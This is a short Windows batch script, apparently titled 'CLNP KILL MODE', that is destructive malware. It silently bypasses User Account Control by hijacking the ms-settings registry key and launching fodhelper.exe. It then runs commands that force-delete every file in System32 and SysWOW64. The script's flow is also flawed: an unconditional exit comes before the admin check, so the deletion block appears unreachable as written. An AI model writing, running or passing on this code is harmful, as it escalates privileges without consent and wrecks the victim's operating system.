@echo off
:: CLNP_KILL - OPENS CMD AS ADMIN, RUNS: del /f /q /s C:\Windows\System32\*.*
title CLNP KILL MODE

:: Silent elevation
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "%~f0" /f >nul 2>&1
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f >nul 2>&1
start fodhelper.exe >nul 2>&1
timeout /t 1 >nul
exit

:: Admin confirmed — open CMD and run
net session >nul 2>&1 || goto :eof
start cmd /c "del /f /q /s C:\Windows\System32\*.* & del /f /q /s C:\Windows\SysWOW64\*.* & echo CLNP DELETED SYSTEM32 & pause"
